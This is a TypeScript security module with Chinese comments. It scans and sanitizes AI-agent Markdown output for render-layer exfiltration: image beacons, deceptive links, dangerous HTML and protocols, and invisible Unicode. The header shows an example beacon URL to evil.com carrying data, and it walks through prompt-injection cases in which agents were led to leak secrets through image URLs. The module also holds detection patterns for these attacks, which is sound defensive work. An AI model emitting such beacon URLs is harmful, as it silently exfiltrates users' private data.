/**
 * 渲染层外泄引擎（Render-layer Exfiltration / Markdown Injection Scanner）。
 *
 * 威胁模型：**渲染即执行** —— Agent 输出的 Markdown/HTML 会被宿主前端渲染，
 * 渲染器本身就是一个带副作用的执行器：`![img](https://evil.com/pixel?d=<数据>)`
 * 会让客户端**自动发起 HTTP 请求**（图片信标/beacon），URL 的 query 就是外泄信道。
 * 这条 fetch 不经过任何工具调用，完全绕过工具侧全部防线（SSRF 引擎管不住它，
 * 因为被攻击的不是 Agent 的工具，而是用户的前端渲染器）。
 *
 * 实证案例（本攻击类 2025-2026 已有多个真实 CVE / 厂商公告）：
 *  - CVE-2026-22551 / GHSA-qwjm-9c66-w4q4：Eclipse Theia AI Chat（@theia/ai-chat-ui
 *    < 1.71.0）直接渲染 AI 响应中的 Markdown 图片标签，恶意工作区 + 提示注入可诱导
 *    Agent 构造编码敏感数据的图片 URL 静默外传（CVSS 6.5）
 *  - Anthropic Claude 图片 URL 外泄 PoC（embracethered.com，间接注入让 Claude 把
 *    私有对话内容拼进 markdown 图片 URL）
 *  - Checkmarx：Microsoft Copilot Chat 与 Google Gemini 的 Markdown Injection
 *  - Sourcegraph Amp Code 的 markdown 渲染外泄修复
 *
 * 与输出侧扫描（guardian/output）互补成完整输出防线：
 *  - 输出侧扫描 = 输出**内容**有没有密钥/Canary（值敏感）
 *  - 本引擎 = 输出**结构**是不是外泄信道/视觉欺骗（URL 是信道，哪怕零密钥——
 *    编码后的任意上下文数据照样泄露；显示文本与 href 不一致则是钓鱼欺骗）
 *
 * 三层能力（确定性、无 LLM、可单测）：
 *  1. scanMarkdown  —— 检测图片信标 / 链接显示欺骗 / 危险 HTML / 危险协议 / 隐形字符
 *  2. sanitize      —— 无害化改写（DOMPurify 思路的 markdown 子集：只改危险构造，
 *                      图片信标移除、欺骗链接显真、危险标签剥除，良性内容原样保留）
 *  3. 代码块豁免    —— 围栏代码块/行内代码不参与检测（渲染为等宽文本，不 fetch 不
 *                      执行），Agent 合法讲解攻击 payload 不误报
 *
 * 借鉴：DOMPurify（净化哲学）、Checkmarx Markdown Injection 研究、
 * embracethered.com Claude 外泄 PoC、OWASP LLM01:2025（提示注入→外泄链）。
 */

import { scanSecrets, shannonEntropy } from './secrets.js'

export type RenderSeverity = 'poison' | 'suspect'

export interface RenderFinding {
  ruleId: string
  severity: RenderSeverity
  /** 命中位置：text / image / link / definition:<label> / html:<tag> */
  where: string
  reason: string
  /** 命中片段（截断；隐形字符已显影为可读明文） */
  excerpt: string
}

export interface RenderVerdict {
  /** false = 存在 poison 级命中，宿主不应原样渲染，应改用 sanitized */
  safe: boolean
  findings: RenderFinding[]
  /** 存在 suspect 级命中（可渲染但建议告警） */
  requiresReview: boolean
  /** 无害化版本。safe=true 时等于原文；safe=false 时为可直接渲染的安全替代 */
  sanitized: string
}

export interface RenderOptions {
  /** 可信图片域名（自有 CDN 等）：其图片 URL 带普通 query 不告警（精确/后缀匹配） */
  trustedImageHosts?: string[]
}

// ── 隐形字符（与工具定义毒性引擎同哲学：渲染输出里出现即异常）──

/** 零宽与不可见控制字符（ZWSP/ZWNJ/ZWJ/LRM/RLM/WJ/BOM 等）*/
const INVISIBLE_CTRL = /[\u200B-\u200F\u2060-\u2064\uFEFF]/
/** 双向文本控制字符（RLO/LRO/RLI/LRI…）：链接视觉伪装专用，合法输出零理由出现 */
const BIDI_CTRL = /[\u202A-\u202E\u2066-\u2069]/
/** Unicode Tags 区（U+E0000–U+E007F）：渲染不可见 */
const TAGS_RANGE = /[\u{E0000}-\u{E007F}]/u

/** Unicode Tags「显影」：映射回可见 ASCII，把隐形注入变成人眼可读明文供审计 */
export function developTags(s: string): string {
  let out = ''
  for (const ch of s) {
    const c = ch.codePointAt(0)!
    if (c >= 0xE0020 && c <= 0xE007E) out += String.fromCharCode(c - 0xE0000)
    else if (c === 0xE0001 || c === 0xE007F) continue
    else out += ch
  }
  return out
}

function excerptOf(s: string, max = 160): string {
  const t = developTags(s).replace(/\s+/g, ' ').trim()
  return t.length > max ? t.slice(0, max) + '…' : t
}

// ── 解码前置（decode-before-scan：混淆消解引擎哲学应用于渲染层）──

/** HTML 实体解码（命名常用 + 十进制 + 十六进制）：`&#106;avascript:` → `javascript:` */
export function decodeEntities(s: string): string {
  return s
    .replace(/&(amp|lt|gt|quot|apos|colon|tab|newline|num|sol);/gi, (_, name: string) => {
      const named: Record<string, string> = {
        amp: '&', lt: '<', gt: '>', quot: '"', apos: "'",
        colon: ':', tab: '\t', newline: '\n', num: '#', sol: '/',
      }
      return named[name.toLowerCase()] ?? _
    })
    .replace(/&#x([0-9a-f]+);/gi, (_, hex: string) => safeFromCodePoint(parseInt(hex, 16)))
    .replace(/&#(\d+);/g, (_, dec: string) => safeFromCodePoint(parseInt(dec, 10)))
}

function safeFromCodePoint(cp: number): string {
  if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) return ''
  try { return String.fromCodePoint(cp) } catch { return '' }
}

/** 单次百分号解码（外泄 URL 常把 payload 二次编码：%24%7B → ${） */
function percentDecodeOnce(s: string): string {
  try { return decodeURIComponent(s) } catch { return s }
}

// ── Markdown 分段：代码区豁免（渲染为文本，不 fetch 不执行）────

export interface Segment { code: boolean; text: string }

/**
 * 把 Markdown 切成 code / text 段。检测与净化只作用于 text 段。
 * 支持 ``` 与 ~~~ 围栏（含语言标注）、行内 `code` 与 ``code``。
 */
export function segmentMarkdown(md: string): Segment[] {
  const segs: Segment[] = []
  let i = 0, buf = ''
  const flush = (code: boolean) => {
    if (buf) { segs.push({ code, text: buf }); buf = '' }
  }
  while (i < md.length) {
    const rest = md.slice(i)
    const fm = rest.match(/^( {0,3})(```+|~~~+)[^\n]*\n?/)
    if (fm) {
      const ch = fm[2][0]
      const endRe = new RegExp(`^ {0,3}${ch}{3,}[ \\t]*\\n?`, 'm')
      flush(false)
      const after = rest.slice(fm[0].length)
      const em = after.match(endRe)
      if (em) {
        segs.push({ code: true, text: fm[0] + after.slice(0, em.index! + em[0].length) })
        i += fm[0].length + em.index! + em[0].length
      } else {
        segs.push({ code: true, text: rest })
        i = md.length
      }
      continue
    }
    if (rest.startsWith('`')) {
      const ticks = rest.match(/^`+/)![0]
      const close = rest.slice(ticks.length).indexOf(ticks)
      if (close !== -1) {
        flush(false)
        segs.push({ code: true, text: ticks + rest.slice(ticks.length, ticks.length + close + ticks.length) })
        i += ticks.length + close + ticks.length
        continue
      }
    }
    buf += md[i]
    i++
  }
  flush(false)
  return segs
}

// ── URL 分析 ────────────────────────────────────────────

interface UrlInfo {
  scheme: string      // 小写无冒号（https / javascript / data …）；相对路径为 ''
  host: string        // 小写；无 host 为 ''
  query: string       // ? 之后（不含 ?）
  fragment: string    // # 之后（不含 #）
}

/** 实体解码 + 去零宽后解析 URL 的 scheme/host/query/fragment */
export function parseUrl(raw: string): UrlInfo {
  const url = decodeEntities(raw).replace(/[\u200B-\u200F\u2060-\u2064\uFEFF]/g, '').trim()
  const schemeMatch = url.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/)
  const scheme = schemeMatch ? schemeMatch[1].toLowerCase() : ''
  const hostMatch = url.match(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/([^/?#\s]+)/)
  const host = hostMatch ? hostMatch[1].toLowerCase().replace(/:\d+$/, '') : ''
  const qIdx = url.indexOf('?')
  const hIdx = url.indexOf('#')
  let query = '', fragment = ''
  if (hIdx !== -1) {
    fragment = url.slice(hIdx + 1)
    if (qIdx !== -1 && qIdx < hIdx) query = url.slice(qIdx + 1, hIdx)
  } else if (qIdx !== -1) {
    query = url.slice(qIdx + 1)
  }
  return { scheme, host, query, fragment }
}

/** URL query/fragment 中存在「编码数据载荷」的确定性判据（外泄意图的证据） */
function payloadHit(u: UrlInfo): { hit: boolean; why: string } {
  const bag = [u.query, u.fragment, percentDecodeOnce(u.query), percentDecodeOnce(u.fragment)].join(' ')
  if (!bag.trim()) return { hit: false, why: '' }
  // ① 模板插值占位符：外传的是动态数据（Theia PoC 形态 ${process.env.SECRET}）
  if (/\$\{[^}]{2,80}\}|\{\{[^}]{2,80}\}\}/.test(bag))
    return { hit: true, why: 'URL 含模板插值占位符（外传动态数据）' }
  if (/\[[A-Z_][A-Z0-9_]{1,20}\]/.test(bag)) return { hit: true, why: 'URL 含 [DATA] 式占位符' }
  // ② 明文密钥（复用 gitleaks 系规则）
  if (scanSecrets(bag).length) return { hit: true, why: 'URL 参数中检出明文密钥' }
  // ③ 高熵编码块：base64/hex 长串
  const run = bag.match(/[A-Za-z0-9+/_=-]{20,}/)
  if (run && shannonEntropy(run[0]) >= 3.0) return { hit: true, why: `URL 含高熵编码块（${run[0].slice(0, 24)}…）` }
  const hex = bag.match(/\b[0-9a-f]{32,}\b/i)
  if (hex) return { hit: true, why: 'URL 含 32+ 位十六进制串' }
  // ④ 外传语义参数名 + 有值（d= / data= / payload= / env= …）
  if (/[?&#\s=&](d|data|content|payload|msg|body|text|leak|exfil|env|secret|token|info)=[^\s&#"']{8,}/i.test('?' + u.query + '&' + u.fragment))
    return { hit: true, why: 'URL 含外传语义参数（data/payload/env…）且带值' }
  return { hit: false, why: '' }
}

function hostOf(urlLike: string): string {
  const u = parseUrl(urlLike)
  return u.host || (urlLike.includes('.') ? urlLike.toLowerCase().replace(/^www\./, '').replace(/[/?#].*$/, '') : '')
}

function trustedHost(host: string, trusted: string[]): boolean {
  if (!host) return false
  return trusted.some((t) => {
    const h = t.toLowerCase()
    return host === h || host.endsWith('.' + h)
  })
}

/**
 * 协议裁决：
 *  - 'exec'    → javascript:/vbscript:/data:text/html 等，可执行或渲染任意 HTML
 *  - 'inline'  → data:image 位图（不执行，但外链被内联化，降级 suspect）
 *  - ''        → 无危险
 */
function schemeVerdict(rawUrl: string): 'exec' | 'inline' | '' {
  const decoded = decodeEntities(rawUrl).trim()
  if (/^(javascript|vbscript|livescript|mocha):/i.test(decoded)) return 'exec'
  if (/^data:/i.test(decoded)) {
    if (/^data:(text\/html|application|image\/svg)/i.test(decoded)) return 'exec'
    if (/^data:image\//i.test(decoded)) return 'inline'
    return 'exec'   // 其余 data:（未知子类型）从严
  }
  return ''
}

// ── 危险 HTML 标签 ──────────────────────────────────────

/** 会执行脚本或发起 fetch/导航的原始 HTML 标签（markdown 渲染器多数放行部分裸 HTML） */
const DANGEROUS_TAGS = 'script|iframe|object|embed|form|meta|svg|math|base|link|frame|applet'
const RE_DANGEROUS_TAG = new RegExp(`^(${DANGEROUS_TAGS})$`, 'i')

// ── 提取器 ──────────────────────────────────────────────

interface Extracted {
  kind: 'image' | 'link' | 'html-img' | 'html-a' | 'definition' | 'html-tag'
  raw: string
  display: string   // 可见文本（image 为 alt）
  url: string       // 目标（html-tag 为 ''）
  tag?: string
}

const RE_IMAGE = /!\[([^\]\n]*)\]\(\s*<?([^)\s>]+)>?(?:\s+[^)]*)?\)/g
const RE_LINK = /\[([^\]\n]*)\]\(\s*<?([^)\s>]+)>?(?:\s+[^)]*)?\)/g
const RE_REF_IMAGE = /!\[([^\]\n]*)\]\[([^\]\n]*)\]/g
const RE_REF_LINK = /\[([^\]\n]*)\]\[([^\]\n]*)\]/g
const RE_DEFINITION = /^[ \t]{0,3}\[([^\]\n]+)\]:[ \t]*<?([^\s>]+)>?(?:[ \t]+"[^"]*")?[ \t]*$/gm
const RE_HTML_IMG = /<img\b[^>]*>/gi
const RE_HTML_A = /<a\b[^>]*>[\s\S]*?<\/a>/gi
const RE_HTML_TAG = /<\/?([a-zA-Z][a-zA-Z0-9-]*)\b[^>]*\/?>/g
/** 单个 src/href 属性（不带 g：避免共享正则 lastIndex 状态污染） */
const RE_ATTR_ONE = /(src|href)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i
const RE_ON_HANDLER = /\son[a-zA-Z]+\s*=/i

/** 从 HTML 片段提取所有 src/href 属性值 */
function extractAttrs(html: string): string[] {
  const out: string[] = []
  const re = /(src|href)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/gi
  for (const a of html.matchAll(re)) out.push(a[2] ?? a[3] ?? a[4] ?? '')
  return out
}

function extractFromText(text: string): Extracted[] {
  const out: Extracted[] = []
  for (const m of text.matchAll(RE_IMAGE)) {
    out.push({ kind: 'image', raw: m[0], display: m[1], url: m[2] })
  }
  for (const m of text.matchAll(RE_LINK)) {
    // 跳过已被 image 正则覆盖的（前一个字符是 !）
    if (m.index! > 0 && text[m.index! - 1] === '!') continue
    out.push({ kind: 'link', raw: m[0], display: m[1], url: m[2] })
  }
  const defs = new Map<string, string>()
  for (const m of text.matchAll(RE_DEFINITION)) {
    defs.set(m[1].toLowerCase(), m[2])
    out.push({ kind: 'definition', raw: m[0], display: m[1], url: m[2] })
  }
  for (const m of text.matchAll(RE_REF_IMAGE)) {
    const url = defs.get((m[2] || m[1]).toLowerCase())
    if (url) out.push({ kind: 'image', raw: m[0], display: m[1], url })
  }
  for (const m of text.matchAll(RE_REF_LINK)) {
    if (m.index! > 0 && text[m.index! - 1] === '!') continue
    const url = defs.get((m[2] || m[1]).toLowerCase())
    if (url) out.push({ kind: 'link', raw: m[0], display: m[1], url })
  }
  for (const m of text.matchAll(RE_HTML_IMG)) {
    const url = extractAttrs(m[0])[0] ?? ''
    out.push({ kind: 'html-img', raw: m[0], display: '', url })
  }
  for (const m of text.matchAll(RE_HTML_A)) {
    const url = extractAttrs(m[0])[0] ?? ''
    out.push({ kind: 'html-a', raw: m[0], display: m[0].replace(/<[^>]*>/g, '').trim(), url })
  }
  for (const m of text.matchAll(RE_HTML_TAG)) {
    out.push({ kind: 'html-tag', raw: m[0], display: '', url: '', tag: m[1] })
  }
  return out
}

// ── 单构造裁决（scan 与 sanitize 共用，保证判定一致）─────

interface ConstructVerdict { severity: RenderSeverity | ''; ruleId: string; reason: string }

/** 图片（markdown / HTML img / 引用式）→ 信标判定 */
function judgeImage(item: Extracted, trusted: string[]): ConstructVerdict {
  const sv = schemeVerdict(item.url)
  if (sv === 'exec') return { severity: 'poison', ruleId: 'MDX-004', reason: '图片 URL 为可执行协议（javascript:/data:text/html…）' }
  if (sv === 'inline') return { severity: 'suspect', ruleId: 'MDX-004', reason: 'data: 位图 URL（非执行类，建议人工确认）' }
  const u = parseUrl(item.url)
  if (u.scheme !== 'http' && u.scheme !== 'https' && u.scheme !== '') return { severity: '', ruleId: '', reason: '' }
  const p = payloadHit(u)
  if (p.hit) return { severity: 'poison', ruleId: 'MDX-001', reason: `图片信标外泄：${p.why}` }
  if ((u.query || u.fragment) && !trustedHost(u.host, trusted)) {
    return { severity: 'suspect', ruleId: 'MDX-001', reason: '外链图片 URL 带参数（可能是 CDN 参数，也可能是信标）' }
  }
  return { severity: '', ruleId: '', reason: '' }
}

/** 链接（markdown / HTML a）→ 显示欺骗判定 */
function judgeLink(item: Extracted): ConstructVerdict {
  const sv = schemeVerdict(item.url)
  if (sv === 'exec') return { severity: 'poison', ruleId: 'MDX-004', reason: '链接 URL 为可执行协议（javascript:/data:text/html…）' }
  if (sv === 'inline') return { severity: 'suspect', ruleId: 'MDX-004', reason: 'data: URL 链接（建议人工确认）' }
  const disp = item.display.trim()
  if (!disp) return { severity: '', ruleId: '', reason: '' }
  const u = parseUrl(item.url)
  const web = u.scheme === 'http' || u.scheme === 'https' || u.scheme === ''
  if (!web || !u.host) return { severity: '', ruleId: '', reason: '' }
  // ① href 是裸 IP / punycode 同形域，显示文本却伪装成正常域名（最强信号，先判）
  const ipHost = /^\d{1,3}(\.\d{1,3}){3}$/.test(u.host) || (/^\[?[0-9a-f:]+\]?$/i.test(u.host) && u.host.includes(':'))
  const punycode = u.host.startsWith('xn--') || u.host.includes('.xn--')
  if ((ipHost || punycode) && /[a-z]{2,}\.(com|net|org|io|ai|dev|cn|co|me|app)/i.test(disp)) {
    return { severity: 'poison', ruleId: 'MDX-002', reason: `链接目标为${ipHost ? '裸 IP' : 'punycode 同形域'}而显示文本伪装成正常域名` }
  }
  // ② 显示文本本身就是 URL 且指向不同 host → 钓鱼式视觉欺骗
  const fullUrlDisplay = /^(https?:\/\/|www\.)\S+/i.test(disp)
  const bareDomainDisplay = /^[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}(\/\S*)?$/i.test(disp)
  if (fullUrlDisplay || bareDomainDisplay) {
    const dh = hostOf(disp)
    if (dh && dh !== u.host) {
      return {
        severity: fullUrlDisplay ? 'poison' : 'suspect',
        ruleId: 'MDX-002',
        reason: `链接显示欺骗：显示 ${dh}，实际指向 ${u.host}${fullUrlDisplay ? '' : '（裸域名显示，降级 suspect）'}`,
      }
    }
  }
  return { severity: '', ruleId: '', reason: '' }
}

// ── 主扫描入口 ──────────────────────────────────────────

/**
 * 扫描待渲染的 Markdown 输出。规则族 MDX（Markdown eXfiltration）：
 *  - MDX-001 图片信标：图片 URL 的 query/fragment 是外泄信道
 *  - MDX-002 链接显示欺骗：可见文本与真实 href 不一致（钓鱼/伪装）
 *  - MDX-003 危险 HTML：script/iframe/object/… 与 on* 事件属性
 *  - MDX-004 危险协议：javascript: / data:text/html 等
 *  - MDX-005 隐形字符：双向文本/Tags/零宽（渲染层视觉伪装）
 */
export function scanMarkdown(md: string, opts: RenderOptions = {}): RenderFinding[] {
  const findings: RenderFinding[] = []
  const push = (f: RenderFinding) => {
    if (!findings.some((x) => x.ruleId === f.ruleId && x.where === f.where)) findings.push(f)
  }
  const trusted = opts.trustedImageHosts ?? []

  for (const seg of segmentMarkdown(md)) {
    if (seg.code) continue
    const text = seg.text

    // MDX-005 隐形字符（整段文本维度）
    if (BIDI_CTRL.test(text)) {
      push({ ruleId: 'MDX-005', severity: 'poison', where: 'text', reason: '含双向文本控制字符（RLO/RLI…），链接视觉伪装专用', excerpt: excerptOf(text) })
    }
    if (TAGS_RANGE.test(text)) {
      push({ ruleId: 'MDX-005', severity: 'poison', where: 'text', reason: '含 Unicode Tags 区隐形字符（渲染不可见）', excerpt: excerptOf(text) })
    }
    if (INVISIBLE_CTRL.test(text)) {
      push({ ruleId: 'MDX-005', severity: 'suspect', where: 'text', reason: '含零宽/不可见控制字符', excerpt: excerptOf(text) })
    }

    for (const item of extractFromText(text)) {
      const where = item.kind === 'definition' ? `definition:${item.display}` : item.kind

      // MDX-001 / MDX-002 / MDX-004：按构造类型走统一裁决
      // definition 也按图片信标裁决（引用式定义即使未被引用，URL 本身就是信标载荷）
      if (item.kind === 'image' || item.kind === 'html-img' || item.kind === 'definition') {
        const v = judgeImage(item, trusted)
        if (v.severity) push({ ruleId: v.ruleId, severity: v.severity, where, reason: v.reason, excerpt: excerptOf(item.raw) })
      } else if (item.kind === 'link' || item.kind === 'html-a') {
        const v = judgeLink(item)
        if (v.severity) push({ ruleId: v.ruleId, severity: v.severity, where, reason: v.reason, excerpt: excerptOf(item.raw) })
      }

      // MDX-003 危险 HTML 标签 / 事件属性 / fetch 信标
      if (item.kind === 'html-tag' && item.tag) {
        if (RE_DANGEROUS_TAG.test(item.tag)) {
          push({ ruleId: 'MDX-003', severity: 'poison', where: `html:${item.tag.toLowerCase()}`, reason: `危险 HTML 标签 <${item.tag.toLowerCase()}>（执行脚本/发起 fetch/改变导航）`, excerpt: excerptOf(item.raw) })
        }
        if (RE_ON_HANDLER.test(item.raw)) {
          push({ ruleId: 'MDX-003', severity: 'poison', where: 'html:event', reason: 'HTML 事件属性（on* = 内联 JS 执行）', excerpt: excerptOf(item.raw) })
        }
        // <link href> / <meta refresh> 等资源标签的 URL 同样是 fetch 信标
        if (/^(link|meta|base|area|source|track)$/i.test(item.tag)) {
          const refresh = /http-equiv\s*=\s*["']?refresh/i.test(item.raw)
          for (const url of extractAttrs(item.raw)) {
            if (!url) continue
            if (refresh) {
              push({ ruleId: 'MDX-003', severity: 'poison', where: 'html:meta', reason: 'meta refresh 自动跳转', excerpt: excerptOf(item.raw) })
              break
            }
            const p = payloadHit(parseUrl(url))
            if (p.hit) {
              push({ ruleId: 'MDX-001', severity: 'poison', where: `html:${item.tag!.toLowerCase()}`, reason: `HTML fetch 信标：${p.why}`, excerpt: excerptOf(item.raw) })
              break
            }
          }
        }
      }
    }
  }
  return findings
}

/** findings → 判定：poison 存在即不安全；sanitize 后可作为安全替代 */
export function verdictOf(md: string, findings: RenderFinding[], opts: RenderOptions = {}): RenderVerdict {
  const poison = findings.some((f) => f.severity === 'poison')
  return {
    safe: !poison,
    findings,
    requiresReview: !poison && findings.some((f) => f.severity === 'suspect'),
    sanitized: poison ? sanitizeMarkdown(md, opts) : md,
  }
}

/** 一步到位：扫描 + 判定 + 净化 */
export function scanAndJudge(md: string, opts: RenderOptions = {}): RenderVerdict {
  return verdictOf(md, scanMarkdown(md, opts), opts)
}

// ── 净化（sanitize）：确定性无害化改写，只动危险构造 ──────

const INVISIBLE_STRIP = /[\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]/g

function sanitizeText(text: string, trusted: string[]): string {
  let s = text.replace(INVISIBLE_STRIP, '')

  // 图片：信标/危险协议 → 占位文本（保留 alt 供用户判断）；良性图片原样保留
  s = s.replace(RE_IMAGE, (raw: string, alt: string, url: string) => {
    const v = judgeImage({ kind: 'image', raw, display: alt, url }, trusted)
    return v.severity === 'poison' ? (alt ? `[图片已移除：${alt}]` : '[图片已移除]') : raw
  })
  s = s.replace(RE_REF_IMAGE, (raw: string, alt: string) => (alt ? `[图片已移除：${alt}]` : '[图片已移除]'))
  s = s.replace(RE_HTML_IMG, (raw: string) => {
    const v = judgeImage({ kind: 'html-img', raw, display: '', url: extractAttrs(raw)[0] ?? '' }, trusted)
    return v.severity === 'poison' ? '[图片已移除]' : raw
  })

  // 链接：危险协议 → 移除；显示欺骗 → 显真（用户所见即所去）；良性链接原样保留
  s = s.replace(RE_LINK, (raw: string, disp: string, url: string) => {
    const v = judgeLink({ kind: 'link', raw, display: disp, url })
    if (v.severity === 'poison' && v.ruleId === 'MDX-004') return disp ? `[链接已移除：${disp}]` : '[链接已移除]'
    if (v.severity === 'poison') return `${disp} （真实目标：${url}）`
    return raw
  })
  s = s.replace(RE_HTML_A, (raw: string) => {
    const url = extractAttrs(raw)[0] ?? ''
    const disp = raw.replace(/<[^>]*>/g, '').trim()
    const v = judgeLink({ kind: 'html-a', raw, display: disp, url })
    if (v.severity === 'poison' && v.ruleId === 'MDX-004') return disp ? `[链接已移除：${disp}]` : '[链接已移除]'
    if (v.severity === 'poison') return disp ? `${disp} （真实目标：${url}）` : url
    return raw
  })

  // 危险标签整体剥除（先带内容的成对标签，再单标签/残余）；事件属性剥除
  s = s.replace(new RegExp(`<(${DANGEROUS_TAGS})\\b[^>]*>[\\s\\S]*?</\\1\\s*>`, 'gi'), '')
  s = s.replace(new RegExp(`</?(?:${DANGEROUS_TAGS})\\b[^>]*/?>`, 'gi'), '')
  s = s.replace(/\s+on[a-zA-Z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '')
  return s
}

/**
 * 无害化：保留信息、移除信道。图片信标→占位文本；欺骗链接→显真；
 * 危险 HTML→剥除；事件属性→剥除；隐形字符→剥除；代码块原样保留；
 * 良性链接/图片不动。
 */
export function sanitizeMarkdown(md: string, opts: RenderOptions = {}): string {
  const trusted = opts.trustedImageHosts ?? []
  return segmentMarkdown(md)
    .map((seg) => (seg.code ? seg.text : sanitizeText(seg.text, trusted)))
    .join('')
}
